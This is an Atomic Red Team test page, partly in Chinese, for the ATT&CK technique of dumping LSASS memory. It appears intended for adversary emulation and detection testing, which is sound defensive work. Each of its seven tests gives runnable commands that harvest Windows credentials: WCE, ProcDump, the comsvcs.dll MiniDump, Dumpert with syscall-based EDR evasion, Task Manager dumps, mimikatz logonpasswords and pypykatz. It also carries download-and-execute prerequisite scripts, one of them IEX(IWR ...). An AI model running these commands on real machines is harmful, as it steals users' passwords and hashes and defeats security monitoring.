# T1003.001 - LSASS Memory
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1003/001)

>敌方试图访问存储在本地安全授权子系统（Local Security Authority Subsystem Service (LSASS)）的进程内存中的用户机密凭据信息。在某个用户登录后，系统将生成和存储各种身份凭据在LSASS进程中。这个凭据可以被管理员用户或SYSTEM用户访问，使用改变认证信息的方法([Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)）执行横向移动 （[Lateral Movement](https://attack.mitre.org/tactics/TA0008) )。

同时，使用内存技术，LSASS进程内存可以从目标机器导出，然后分析一个本地账户。

例如：在目标主机中使用 procdump：

```procdump -ma lsass.exe lsass_dump```

本地化的 mimikatz 可以如下运行:
```sekurlsa::Minidump lsassdump.dmp```

```sekurlsa::logonPasswords```


系统启动时，Windows Security Support Provider (SSP) DLLs 被加载到 LSSAS 进程中。一旦导入了LSA，SSP DLLs 就可访问存储在Windows中的加密的或明文的密码，例如登录账户的域密码或smart card PINs。SSP 配置被存放在两个注册表键中：

```HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages```

```HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages```

某个敌方可能改变这些注册表键来增加新的SSPs，这将在下次系统启动时被加载，或者当 AddSecurityPackage Windows API 函数被调用时被加载。(Citation: Graeber 2014)

下面的SSPs可用于访问账户 credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)


## Atomic Tests

- [Atomic Test #1 - Windows Credential Editor](#atomic-test-1---windows-credential-editor)

- [Atomic Test #2 - Dump LSASS.exe Memory using ProcDump](#atomic-test-2---dump-lsassexe-memory-using-procdump)

- [Atomic Test #3 - Dump LSASS.exe Memory using comsvcs.dll](#atomic-test-3---dump-lsassexe-memory-using-comsvcsdll)

- [Atomic Test #4 - Dump LSASS.exe Memory using direct system calls and API unhooking](#atomic-test-4---dump-lsassexe-memory-using-direct-system-calls-and-api-unhooking)

- [Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager](#atomic-test-5---dump-lsassexe-memory-using-windows-task-manager)

- [Atomic Test #6 - Offline Credential Theft With Mimikatz](#atomic-test-6---offline-credential-theft-with-mimikatz)

- [Atomic Test #7 - LSASS read with pypykatz](#atomic-test-7---lsass-read-with-pypykatz)



## Atomic Test #1 - Windows Credential Editor
使用Windows Credentials Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only) 导出 user credentials 。

一旦成功，你就能看到一个含有用户密码/hashes的文件，位置：%temp%/wce-output.file.

如果你没看到输出，可能是执行过程被反病毒软件阻断了。

如果你看到一条消息说："wce.exe is not recognized as an internal or external command\", 那么尝试使用 get-prereq_commands 先下载和安装 Windows Credential Editor 。

**Supported Platforms:** Windows

#### Inputs:

| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| output_file | Path where resulting data should be placed | Path | %temp%&#92;wce-output.txt|
| wce_zip_hash | File hash of the Windows Credential Editor zip file | String | 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933|
| wce_exe | Path of Windows Credential Editor executable | Path | PathToAtomicsFolder&#92;T1003.001&#92;bin&#92;wce.exe|
| wce_url | Path to download Windows Credential Editor zip file | url | https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip|


#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
#{wce_exe} -o #{output_file}
```

#### Cleanup Commands:
```cmd
del "#{output_file}" >nul 2>&1
```

#### Dependencies:  Run with `powershell`!
##### Description: Windows Credential Editor must exist on disk at specified location (#{wce_exe})
##### Check Prereq Commands:
```powershell
if (Test-Path #{wce_exe}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
$parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
  Expand-Archive $zippath $parentpath\wce -Force
  Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
  Remove-Item $zippath, $parentpath\wce -Recurse
}
```

<br/>
<br/>

## Atomic Test #2 - Dump LSASS.exe Memory using ProcDump

lsass.exe 内存信息常被见离线的 credentials 窃取攻击。这可以使用 Sysinternals 中的
ProcDump实现。

一旦成功，你会看到下列文件被生产: `c:\windows\temp\lsass_dump.dmp`.

如果你看到一条消息说 "procdump.exe is not recognized as an internal or external command", 尝试使用  get-prereq_commands 下载和安装 ProcDump tool first.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| output_file | Path where resulting dump should be placed | Path | C:&#92;Windows&#92;Temp&#92;lsass_dump.dmp|
| procdump_exe | Path of Procdump executable | Path | PathToAtomicsFolder&#92;T1003.001&#92;bin&#92;procdump.exe|


#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
#{procdump_exe} -accepteula -ma lsass.exe #{output_file}
```

注：-accepteula 表示自动接受 sysinternals的协议；-ma 表示写一个完整的dump文件。
#### Cleanup Commands:
```cmd
del "#{output_file}" >nul 2> nul
```



#### Dependencies:  Run with `powershell`!
##### Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
##### Check Prereq Commands:
```powershell
if (Test-Path #{procdump_exe}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
```




<br/>
<br/>

## Atomic Test #3 - Dump LSASS.exe Memory using comsvcs.dll
还可以使用内置的dll来窃取lsass.exe内存信息。

一旦成功，你可以看到文件`$env:TEMP\lsass-comsvcs.dmp.`被生成.

**Supported Platforms:** Windows

#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

#### Cleanup Commands:
```powershell
Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #4 - Dump LSASS.exe Memory using direct system calls and API unhooking

还可以通过直接系统调用和API unhooking 来避免检测的导出 lsass.exe 内存内容。

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 

https://github.com/outflanknl/Dumpert
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/

Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| dumpert_exe | Path of Dumpert executable | Path | PathToAtomicsFolder&#92;T1003.001&#92;bin&#92;Outflank-Dumpert.exe|


#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
#{dumpert_exe}
```

#### Cleanup Commands:
```cmd
del C:\windows\temp\dumpert.dmp >nul 2> nul
```



#### Dependencies:  Run with `powershell`!
##### Description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})
##### Check Prereq Commands:
```powershell
if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
```




<br/>
<br/>

## Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager

还可以使用Windows 任务管理器和管理员权限来实现窃取 lsass.exe 内存内容。

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task Manager and administrative permissions.

**Supported Platforms:** Windows

#### Run it with these steps! 
1. Open Task Manager:
  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking on the task bar and selecting "Task Manager".

2. Select lsass.exe:
  If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
  and select it for manipulation.

3. Dump lsass.exe memory:
  Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.

windows10 中这个进程为LSAP





<br/>
<br/>

## Atomic Test #6 - Offline Credential Theft With Mimikatz

The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| input_file | Path of the Lsass dump | Path | %tmp%&#92;lsass.DMP|
| mimikatz_exe | Path of the Mimikatz binary | string | PathToAtomicsFolder&#92;T1003.001&#92;bin&#92;mimikatz.exe|


#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
```




#### Dependencies:  Run with `powershell`!
##### Description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})
##### Check Prereq Commands:
```powershell
if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
```
##### Description: Lsass dump must exist at specified location (#{input_file})
##### Check Prereq Commands:
```powershell
cmd /c "if not exist #{input_file} (exit /b 1)" 
```
##### Get Prereq Commands:
```powershell
Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
```




<br/>
<br/>

## Atomic Test #7 - LSASS read with pypykatz
Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

Successful execution of this test will display multiple useranames and passwords/hashes to the screen.

**Supported Platforms:** Windows





#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
pypykatz live lsa
```




#### Dependencies:  Run with `powershell`!
##### Description: Computer must have python 3 installed
##### Check Prereq Commands:
```powershell
if (python --version) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
echo "Python 3 must be installed manually"
```
##### Description: Computer must have pip installed
##### Check Prereq Commands:
```powershell
if (pip3 -V) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
echo "PIP must be installed manually"
```
##### Description: pypykatz must be installed and part of PATH
##### Check Prereq Commands:
```powershell
if (cmd /c pypykatz -h) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
pip3 install pypykatz
```




<br/>
